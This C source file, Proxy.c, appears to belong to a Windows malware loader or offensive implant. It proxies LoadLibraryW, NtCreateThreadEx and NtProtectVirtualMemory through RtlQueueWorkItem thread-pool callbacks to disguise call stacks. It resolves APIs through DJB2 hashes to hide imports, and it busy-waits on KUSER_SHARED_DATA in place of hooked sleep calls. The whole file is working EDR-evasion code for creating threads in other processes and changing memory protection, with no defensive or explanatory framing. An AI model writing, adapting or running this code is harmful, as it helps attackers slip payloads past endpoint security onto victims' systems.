// Proxy.c
#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"

// Global
extern WIN32_API g_Win32;

/*=========================================
@ SharedTimeStamp & SharedSleep Functions
===========================================*/
ULONG64 SharedTimeStamp() {

	volatile PKUSER_SHARED_DATA SharedData = USER_SHARED_DATA;
	
	LARGE_INTEGER TimeStamp = {
		.LowPart   = SharedData->SystemTime.LowPart,
		.HighPart  = SharedData->SystemTime.High1Time
	};

	return TimeStamp.QuadPart;
}

VOID SharedSleep(IN ULONG64 Milliseconds) {

	ULONG64 Start = SharedTimeStamp() + (Milliseconds * DELAY_TICKS);

	for (SIZE_T i = 0; SharedTimeStamp() < Start; i++);

	if ((SharedTimeStamp() - Start) > 2000)
		return;
}

/*=========================================
@ WorkItemProxyLoadLibraryW Function
===========================================*/
PVOID WorkItemProxyLoadLibraryW(IN PWSTR Library) {

	PVOID						Module				= { 0 };
	NTSTATUS					Status				= { 0 };
	ULONG						Count				= { 0 };

	if (!NT_SUCCESS(Status = g_Win32.Nt.RtlQueueWorkItem((PVOID)g_Win32.K32.LoadLibraryW, Library, WT_EXECUTEDEFAULT))) {
#ifdef DEBUG
		DBGPRINT("[-] RtlQueueWorkItem Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	Count = 5;

	do {
		if ((Module = g_Win32.K32.GetModuleHandleW(Library))) {
			break;
		}
		SharedSleep(100);
	} while (Count--);

Leave:
	return Module;
}

/*=========================================
@ WorkItemProxyNtCreateThreadEx Function
===========================================*/
typedef struct _CREATE_THREAD_CTX {
	PVOID	NtCreateThreadEx;

	struct {
		PVOID	ThreadHandle;
		PVOID	ProcessHandle;
		PVOID	StartRoutine;
		PVOID	Argument;
	} Args;
} CREATE_THREAD_CTX, *PCREATE_THREAD_CTX;

extern VOID StubProxyNtCreateThreadEx(IN PCREATE_THREAD_CTX Ctx);

HANDLE WorkItemProxyNtCreateThreadEx(
	_In_ PHANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_ PVOID Argument
) {
	HANDLE						EventHandle			= { 0 };
	HANDLE						ThreadHandle		= { 0 };
	NTSTATUS					Status				= { 0 };
	CREATE_THREAD_CTX			Ctx					= {
											.NtCreateThreadEx = LdrRetrieveFunction(LdrGetModule(NTDLL_DJB2), NtCreateThreadEx_DJB2),

											.Args   = {
													.ProcessHandle	= ProcessHandle,
													.ThreadHandle	= &ThreadHandle,
													.StartRoutine	= StartRoutine,
													.Argument		= Argument
	},
  };

	if (!NT_SUCCESS(Status = g_Win32.Nt.NtCreateEvent(&EventHandle, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE))) {
#ifdef DEBUG
		DBGPRINT("[-] NtCreateEvent Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	if (!NT_SUCCESS(Status = g_Win32.Nt.RtlQueueWorkItem(StubProxyNtCreateThreadEx, &Ctx, WT_EXECUTEDEFAULT))) {
#ifdef DEBUG
		DBGPRINT("[-] RtlQueueWorkItem Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	if (!NT_SUCCESS(Status = g_Win32.Nt.RtlQueueWorkItem((PVOID)g_Win32.K32.SetEvent, EventHandle, WT_EXECUTEDEFAULT))) {
#ifdef DEBUG
		DBGPRINT("[-] RtlQueueWorkItem[2] Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	g_Win32.K32.WaitForSingleObject(EventHandle, 0x1000);

Leave:
	if (EventHandle) {
		DELETE_HANDLE(EventHandle);
	}

	return ThreadHandle;
}

/*=========================================
@ WorkItemProxyNtProtectVirtualMemory Function
===========================================*/
typedef struct _PROTECT_MEMORY_CTX {
	PVOID	NtProtectVirtualMemory;

	struct {
		HANDLE		ProcessHandle;
		PVOID		*BaseAddress;
		PSIZE_T		RegionSize;
		ULONG		NewProtection;
		PULONG		OldProtection;
	} Args;
} PROTECT_MEMORY_CTX, *PPROTECT_MEMORY_CTX;

extern VOID StubProxyNtProtectVirtualMemory(IN PPROTECT_MEMORY_CTX Ctx);

NTSTATUS WorkItemProxyNtProtectVirtualMemory(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID* BaseAddress,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG NewProtection,
	_Out_ PULONG OldProtection
) {

	HANDLE					EventHandle		= { 0 };
	NTSTATUS				Status			= { 0 };
	PROTECT_MEMORY_CTX		Ctx				= {
										.NtProtectVirtualMemory = LdrRetrieveFunction(LdrGetModule(NTDLL_DJB2), NtProtectVirtualMemory_DJB2),
										
										.Args = {
											.ProcessHandle = ProcessHandle,
											.BaseAddress = BaseAddress,
											.RegionSize = RegionSize,
											.NewProtection = NewProtection,
											.OldProtection = OldProtection
		},
	};

	if (!NT_SUCCESS(Status = g_Win32.Nt.NtCreateEvent(&EventHandle, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE))) {
#ifdef DEBUG
		DBGPRINT("[-] NtCreateEvent Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	if (!NT_SUCCESS(Status = g_Win32.Nt.RtlQueueWorkItem(StubProxyNtProtectVirtualMemory, &Ctx, WT_EXECUTEDEFAULT))) {
#ifdef DEBUG
		DBGPRINT("[-] RtlQueueWorkItem Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	if (!NT_SUCCESS(Status = g_Win32.Nt.RtlQueueWorkItem((PVOID)g_Win32.K32.SetEvent, EventHandle, WT_EXECUTEDEFAULT))) {
#ifdef DEBUG
		DBGPRINT("[-] RtlQueueWorkItem[2] Failed With Error -> [%lx] - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
		goto Leave;
	}

	g_Win32.K32.WaitForSingleObject(EventHandle, 0x1000);

Leave:
	if (EventHandle) {
		DELETE_HANDLE(EventHandle);
	}

	return Status;
}
